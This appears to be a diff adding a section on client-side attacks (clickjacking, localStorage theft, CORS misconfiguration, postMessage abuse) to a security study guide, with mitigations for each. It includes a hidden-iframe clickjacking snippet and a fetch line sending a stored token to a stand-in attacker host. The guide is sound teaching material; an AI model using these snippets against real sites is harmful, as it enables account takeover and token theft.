@@ -7663,6 +7663,480 @@ But attacker can:
 
 ---
 
+# 🔥 CLIENT-SIDE & BROWSER ATTACKS - Clickjacking
+
+> **Client-side attacks exploit browser trust, storage, and cross-origin mechanisms to compromise users and pivot into backend systems.**
+> **Clickjacking manipulates browser framing to trick users into performing unintended actions.**
+---
+
+## 🧠 Core Principle
+
+> **Clickjacking tricks a user into clicking something different from what they perceive.**
+
+Also known as:
+
+> **UI redressing attack.**
+
+The attacker overlays your site inside a hidden iframe.
+
+User believes they are clicking:
+
+* “Play video”
+* “Like”
+* “Download”
+
+But actually clicks:
+
+* “Transfer money”
+* “Delete account”
+* “Grant camera permission”
+* “Enable admin”
+
+---
+
+## 🔍 How Clickjacking Works
+
+Attacker page:
+
+```html
+<iframe src="https://bank.com/transfer" 
+        style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;">
+</iframe>
+
+<button>Click here to win!</button>
+```
+
+Victim sees:
+
+“Click here to win!”
+
+Actually clicking invisible bank transfer button.
+
+Because:
+
+> **The browser allows embedding by default unless restricted.**
+
+---
+
+## 🔥 Real-World Clickjacking Targets
+
+* Financial transfers
+* Password changes
+* MFA reset
+* Social media “Like” abuse
+* Permission granting (camera, mic)
+* OAuth consent screens
+
+Even cloud dashboards have been clickjacked historically.
+
+---
+
+## 🔥 Advanced Clickjacking Variants
+
+---
+
+### 🔹 Cursorjacking
+
+CSS manipulates cursor position.
+
+User thinks cursor is elsewhere.
+
+Actually clicking hidden element.
+
+---
+
+### 🔹 Drag-and-Drop Attacks
+
+User drags object.
+
+Actually triggers hidden input fields.
+
+---
+
+### 🔹 Multi-step Framing Attacks
+
+Invisible frames layered precisely over buttons.
+
+Pixel-perfect exploitation.
+
+---
+
+## 🛡️ Clickjacking Mitigation
+
+---
+
+### 🔐 1️⃣ X-Frame-Options (Legacy but Effective)
+
+Header:
+
+```
+X-Frame-Options: DENY
+```
+
+Or:
+
+```
+X-Frame-Options: SAMEORIGIN
+```
+
+Prevents embedding in iframe.
+
+But limited flexibility.
+
+---
+
+### 🔐 2️⃣ CSP frame-ancestors (Modern Defense)
+
+Example:
+
+```
+Content-Security-Policy: frame-ancestors 'self'
+```
+
+More flexible than X-Frame-Options.
+
+Allows specifying trusted domains.
+
+---
+
+### 🔐 3️⃣ SameSite Cookies (Indirect Protection)
+
+If embedded in cross-site iframe:
+
+Cookies may not be sent.
+
+Reduces impact.
+
+---
+
+### 🔐 4️⃣ Require Re-authentication for Sensitive Actions
+
+Even if clickjacked:
+
+Require:
+
+* Password re-entry
+* MFA confirmation
+
+Prevents blind exploitation.
+
+---
+
+## 🧠 Deep Insight
+
+Clickjacking exploits:
+
+> **Human perception, not code execution.**
+
+It bypasses technical validation by exploiting:
+
+* User trust
+* UI design
+* Browser rendering
+
+---
+
+# 🔥 HTML5 Security Issues
+
+Modern browsers introduced powerful features:
+
+* Local storage
+* Cross-origin communication
+* Web workers
+* Service workers
+* Web messaging
+* CORS
+
+Each feature expands capability.
+
+Each feature expands attack surface.
+
+---
+
+## 🔹 1️⃣ Local Storage Misuse
+
+---
+
+### 🧠 Core Principle
+
+> **Local storage is accessible to any JavaScript running in the origin.**
+
+If attacker achieves XSS:
+
+They can read:
+
+* JWT tokens
+* API keys
+* Sensitive session data
+
+Unlike HTTPOnly cookies:
+
+Local storage is directly accessible via JS.
+
+---
+
+### 🔥 Example
+
+App stores JWT:
+
+```javascript
+localStorage.setItem("token", jwt);
+```
+
+If XSS occurs:
+
+```javascript
+fetch("https://attacker.com/steal?token=" + localStorage.token)
+```
+
+Token stolen.
+
+Account takeover possible.
+
+---
+
+### 🔥 Why Developers Use Local Storage
+
+Because:
+
+* Easy to access
+* Persistent
+* Not automatically sent with requests
+
+But:
+
+> **Convenience reduces security isolation.**
+
+---
+
+### 🔐 Mitigation
+
+* Avoid storing sensitive tokens in localStorage.
+* Prefer HTTPOnly cookies.
+* Use secure flags.
+* Short-lived tokens.
+* Strong XSS prevention.
+
+---
+
+## 🔹 2️⃣ CORS Misconfiguration
+
+---
+
+### 🧠 Core Principle
+
+> **CORS controls which origins can read responses from your API.**
+
+Misconfiguration can allow:
+
+* Any domain to read authenticated responses
+* Cross-origin credential leakage
+* Data exfiltration via malicious sites
+
+---
+
+### 🔥 Dangerous Configuration
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+This combination is dangerous.
+
+It allows:
+
+Any origin to send authenticated requests and read responses.
+
+---
+
+### 🔥 Example Attack
+
+Victim logged into:
+
+```
+api.bank.com
+```
+
+Attacker site:
+
+```
+evil.com
+```
+
+If CORS allows:
+
+```
+evil.com
+```
+
+To read bank responses:
+
+Attacker script reads:
+
+* Account balance
+* Transaction history
+* Personal info
+
+All through victim’s browser.
+
+---
+
+### 🔥 Why CORS Mistakes Happen
+
+Developers:
+
+* Copy-paste wildcard config
+* Enable CORS for testing
+* Forget to restrict credentials
+* Misunderstand preflight behavior
+
+---
+
+### 🔐 CORS Mitigation
+
+* Never use `*` with credentials.
+* Explicitly whitelist origins.
+* Validate Origin header carefully.
+* Use strict configuration per environment.
+
+---
+
+## 🔹 3️⃣ PostMessage Abuse
+
+---
+
+### 🧠 Core Principle
+
+> **window.postMessage allows cross-origin communication between windows or iframes.**
+
+If implemented incorrectly:
+
+Attackers can:
+
+* Send malicious data
+* Spoof messages
+* Trigger unintended actions
+
+---
+
+#### 🔥 Example Vulnerability
+
+Receiver code:
+
+```javascript
+window.addEventListener("message", function(event) {
+   processData(event.data);
+});
+```
+
+No validation of:
+
+```
+event.origin
+```
+
+Attacker iframe sends:
+
+```
+window.postMessage({action: "deleteAccount"}, "*");
+```
+
+If processData executes without origin check:
+
+Sensitive action triggered.
+
+---
+
+#### 🔥 Why This Is Dangerous
+
+postMessage bypasses:
+
+* Same-Origin Policy
+* Cross-origin restrictions
+
+But only if:
+
+Origin validation is missing.
+
+---
+
+### 🔐 Mitigation
+
+Always validate:
+
+```javascript
+if (event.origin !== "https://trusted.com") return;
+```
+
+Never use:
+
+```
+"*"
+```
+
+As target origin unless absolutely necessary.
+
+---
+
+## 🔥 Additional HTML5 Attack Surfaces (2026 Context)
+
+---
+
+### 🔹 Service Worker Abuse
+
+If attacker injects malicious service worker:
+
+They control:
+
+* All requests
+* All responses
+* Offline cache
+* Token interception
+
+Persistent browser compromise.
+
+---
+
+### 🔹 WebSocket Security Gaps
+
+If authentication not revalidated:
+
+Session hijack possible.
+
+---
+
+### 🔹 Browser Extension Risks
+
+Malicious extensions can:
+
+* Inject scripts
+* Read DOM
+* Steal tokens
+
+Enterprise environments must consider this.
+
+---
+
+## 🧠 Deep Insight
+
+Client-side vulnerabilities are dangerous because:
+
+> **The browser is a privileged mediator between user and backend.**
+
+If browser behavior is manipulated:
+
+Attackers can:
+
+* Steal credentials
+* Impersonate users
+* Trigger backend actions
+* Extract data
+
+Without directly attacking server.
+
+---
+
 # Quotes
 
 # References
